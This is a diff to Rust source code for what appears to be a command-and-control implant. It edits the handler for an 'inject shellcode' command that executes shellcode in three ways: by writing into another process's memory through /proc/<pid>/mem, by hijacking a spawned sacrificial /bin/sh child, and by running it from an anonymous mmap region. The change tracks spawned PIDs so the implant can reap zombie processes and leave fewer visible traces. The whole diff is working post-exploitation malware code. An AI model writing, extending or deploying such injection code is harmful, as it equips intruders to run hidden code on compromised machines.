@@ -47,15 +47,22 @@ pub(super) async fn execute_inject_shellcode(
 
     tracing::debug!(way, shellcode_len = shellcode.len(), pid, "inject shellcode");
 
-    let status = match way {
-        INJECT_WAY_INJECT => inject_shellcode_into_pid(pid as u32, &shellcode).await,
-        INJECT_WAY_SPAWN => inject_shellcode_spawn(&shellcode).await,
-        INJECT_WAY_EXECUTE => inject_shellcode_execute(&shellcode),
+    let (status, spawn_pid) = match way {
+        INJECT_WAY_INJECT => (inject_shellcode_into_pid(pid as u32, &shellcode).await, None),
+        INJECT_WAY_SPAWN => {
+            let (s, p) = inject_shellcode_spawn(&shellcode).await;
+            (s, p)
+        }
+        INJECT_WAY_EXECUTE => (inject_shellcode_execute(&shellcode), None),
         _ => {
             tracing::warn!(way, "unknown injection way");
-            INJECT_ERROR_FAILED
+            (INJECT_ERROR_FAILED, None)
         }
     };
+
+    if let Some(pid) = spawn_pid {
+        state.track_injected_pid(pid);
+    }
 
     state.queue_callback(PendingCallback::Structured {
         command_id: u32::from(DemonCommand::CommandInjectShellcode),
@@ -139,10 +146,16 @@ async fn inject_shellcode_into_pid(pid: u32, shellcode: &[u8]) -> u32 {
 /// Forks a child that immediately stops itself (`SIGSTOP`), then uses the
 /// same `/proc/<pid>/mem` technique to overwrite its entry point with the
 /// shellcode before resuming it.
-async fn inject_shellcode_spawn(shellcode: &[u8]) -> u32 {
+/// Returns `(status, child_pid)`.
+///
+/// `child_pid` is `Some` whenever a sacrificial process was successfully spawned,
+/// regardless of whether injection succeeded.  The caller must pass it to
+/// [`PhantomState::track_injected_pid`] so the check-in loop can reap the child
+/// via `waitpid(WNOHANG)` once it exits — preventing zombie `<defunct>` entries.
+async fn inject_shellcode_spawn(shellcode: &[u8]) -> (u32, Option<u32>) {
     if shellcode.is_empty() {
         tracing::warn!("empty shellcode payload");
-        return INJECT_ERROR_FAILED;
+        return (INJECT_ERROR_FAILED, None);
     }
 
     let child = match Command::new("/bin/sh")
@@ -155,13 +168,14 @@ async fn inject_shellcode_spawn(shellcode: &[u8]) -> u32 {
         Ok(c) => c,
         Err(e) => {
             tracing::warn!(%e, "failed to spawn sacrificial process");
-            return INJECT_ERROR_FAILED;
+            return (INJECT_ERROR_FAILED, None);
         }
     };
 
     let child_pid = child.id();
 
-    inject_shellcode_into_pid(child_pid, shellcode).await
+    let status = inject_shellcode_into_pid(child_pid, shellcode).await;
+    (status, Some(child_pid))
 }
 
 /// Execute shellcode in the current process using an anonymous mmap region.
